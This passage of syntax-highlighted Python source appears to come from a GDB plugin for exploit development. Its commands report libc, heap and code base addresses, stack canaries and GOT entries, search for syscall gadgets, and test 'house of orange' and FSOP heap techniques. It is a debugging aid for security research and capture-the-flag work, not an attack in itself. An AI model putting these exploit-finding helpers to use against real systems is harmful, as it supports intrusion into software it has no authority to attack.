</span></span><span class="line"><span class="cl">        <span class="n">args</span> <span class="o">+=</span> <span class="p">[</span><span class="kc">None</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">args</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">PwnCmd</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">commands</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="n">prevbp</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="n">bpoff</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># list all commands</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">commands</span> <span class="o">=</span> <span class="p">[</span><span class="n">cmd</span> <span class="k">for</span> <span class="n">cmd</span> <span class="ow">in</span> <span class="nb">dir</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="k">if</span> <span class="n">callable</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">cmd</span><span class="p">))</span> <span class="p">]</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">libc</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Get libc base &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">libcbs</span> <span class="o">=</span> <span class="n">libcbase</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[34m&#34;</span> <span class="o">+</span> <span class="s2">&#34;libc : &#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[37m&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libcbs</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">heapbase</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Get heapbase &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">heapbase</span> <span class="o">=</span> <span class="n">getheapbase</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">heapbase</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[34m&#34;</span> <span class="o">+</span> <span class="s2">&#34;heapbase : &#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[37m&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heapbase</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;heap not found&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">ld</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Get ld.so base &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[34m&#34;</span> <span class="o">+</span> <span class="s2">&#34;ld : &#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[37m&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ldbase</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">codebase</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Get text base &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">codebs</span> <span class="o">=</span> <span class="n">codeaddr</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[34m&#34;</span> <span class="o">+</span> <span class="s2">&#34;codebase : &#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[37m&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">codebs</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">tls</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Get tls base &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[34m&#34;</span> <span class="o">+</span> <span class="s2">&#34;tls : &#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[37m&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">gettls</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">canary</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Get canary value &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[34m&#34;</span> <span class="o">+</span> <span class="s2">&#34;canary : &#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[37m&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">getcanary</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">fmtarg</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">addr</span><span class="p">,)</span> <span class="o">=</span> <span class="n">normalize_argv</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">getfmtarg</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">off</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">arg</span><span class="p">)</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Calculate the offset of libc &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#(sym,)= normalize_argv(arg,1)</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">sym</span><span class="p">,)</span> <span class="o">=</span> <span class="n">normalize_argv</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">symaddr</span> <span class="o">=</span> <span class="n">getoff</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">symaddr</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Not found the symbol&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">int</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[34m&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>  <span class="o">+</span> <span class="s2">&#34;:&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[37m&#34;</span> <span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">symaddr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[34m&#34;</span> <span class="o">+</span> <span class="n">sym</span>  <span class="o">+</span> <span class="s2">&#34;:&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[37m&#34;</span> <span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">symaddr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">offf</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">arg</span><span class="p">)</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Calculate the offset of libc &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#(sym,)= normalize_argv(arg,1)</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">sym</span><span class="p">,)</span> <span class="o">=</span> <span class="n">normalize_argv</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">codebs</span> <span class="o">=</span> <span class="n">codeaddr</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[34m&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>  <span class="o">+</span> <span class="s2">&#34;:&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[37m&#34;</span> <span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">sym</span> <span class="o">-</span> <span class="n">codebs</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">fp</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; show FILE structure &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">addr</span><span class="p">,)</span> <span class="o">=</span> <span class="n">normalize_argv</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">showfp</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">fpchain</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; show FILE chain &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">showfpchain</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">orange</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; test house of orange &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">addr</span><span class="p">,)</span> <span class="o">=</span> <span class="n">normalize_argv</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">addr</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">testorange</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;You need to specifiy an address&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">fsop</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; test fsop &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">addr</span><span class="p">,)</span> <span class="o">=</span> <span class="n">normalize_argv</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">testfsop</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">magic</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Print usefual variables or function in glibc &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">getarch</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;========== function ==========&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">magic_function</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[34m&#34;</span> <span class="o">+</span> <span class="n">f</span>  <span class="o">+</span> <span class="s2">&#34;:&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[33m&#34;</span> <span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">getoff</span><span class="p">(</span><span class="n">f</span><span class="p">)))</span> 
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[00m========== variables ==========&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">magic_variable</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;x/&#34;</span> <span class="o">+</span> <span class="n">word</span> <span class="o">+</span> <span class="s2">&#34;&amp;&#34;</span> <span class="o">+</span><span class="n">v</span>
</span></span><span class="line"><span class="cl">                <span class="n">content</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="n">offset</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">getoff</span><span class="p">(</span><span class="s2">&#34;&amp;&#34;</span><span class="o">+</span> <span class="n">v</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="n">pad</span> <span class="o">=</span> <span class="mi">36</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[34m</span><span class="si">%s</span><span class="se">\033</span><span class="s2">[33m(</span><span class="si">%s</span><span class="s2">)</span><span class="se">\033</span><span class="s2">[37m</span><span class="si">%s</span><span class="s2">: </span><span class="se">\033</span><span class="s2">[37m</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="s1">&#39; &#39;</span> <span class="o">*</span><span class="n">pad</span><span class="p">,</span> <span class="n">content</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;You need run the program first&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">findsyscall</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; find the syscall gadget&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">arch</span> <span class="o">=</span> <span class="n">getarch</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">start</span><span class="p">,</span><span class="n">end</span> <span class="o">=</span> <span class="n">codeaddr</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">arch</span> <span class="o">==</span> <span class="s2">&#34;x86-64&#34;</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;find 0x050f &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">end</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s2">&#34;i386&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;find 0x80cd &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">end</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s2">&#34;arm&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;find 0xbc80df00 &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">end</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s2">&#34;aarch64&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;find 0xd4000001 &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34; &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">end</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">got</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Print the got table &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">processname</span> <span class="o">=</span> <span class="n">getprocname</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">processname</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;objdump -R &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">iscplus</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">cmd</span> <span class="o">+=</span> <span class="s2">&#34;--demangle &#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">processname</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">got</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">got</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;No current process or executable file specified.&#34;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">dyn</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; Print dynamic section &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">processname</span> <span class="o">=</span> <span class="n">getprocname</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">processname</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">dyn</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s2">&#34;readelf -d </span><span class="se">\&#34;</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">processname</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">dyn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;No current process or executable file specified.&#34;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">readelf</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;Print the seccons&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">processname</span> <span class="o">=</span> <span class="n">getprocname</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">elfinfo</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">        <span class="n">codebs</span> <span class="o">=</span> <span class="n">codeaddr</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s2">&#34;readelf -W -S </span><span class="se">\&#34;</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">processname</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">shell</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">out</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&#34;.*\[.*\] (\.[^ ]*) [^0-9]* ([^ ]*) [^ ]* ([^ ]*)(.*)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">matches</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">matches</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># print(matches)</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;[(&#39;.interp&#39;, &#39;0000000000000318&#39;, &#39;00001c&#39;, &#39; 00   A  0   0  1&#39;), (&#39;.note.gn]&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">hname</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">attr</span><span class="p">)</span> <span class="ow">in</span> <span class="n">matches</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">start</span><span class="p">,</span><span class="n">end</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">start</span><span class="p">,</span><span class="mi">16</span><span class="p">),</span><span class="nb">int</span><span class="p">(</span><span class="n">start</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">start</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="n">codebs</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">start</span> <span class="o">+=</span> <span class="n">codebs</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">end</span> <span class="o">&lt;</span> <span class="n">codebs</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">end</span> <span class="o">+=</span> <span class="n">codebs</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;X&#34;</span> <span class="ow">in</span> <span class="n">attr</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">htype</span> <span class="o">=</span> <span class="s2">&#34;code&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="s2">&#34;W&#34;</span> <span class="ow">in</span> <span class="n">attr</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">htype</span> <span class="o">=</span> <span class="s2">&#34;data&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">htype</span> <span class="o">=</span> <span class="s2">&#34;rodata&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">elfinfo</span><span class="p">[</span><span class="n">hname</span><span class="o">.</span><span class="n">strip</span><span class="p">()]</span> <span class="o">=</span> <span class="p">(</span><span class="n">start</span><span class="p">,</span><span class="n">end</span><span class="p">,</span><span class="n">htype</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">elfinfo</span>
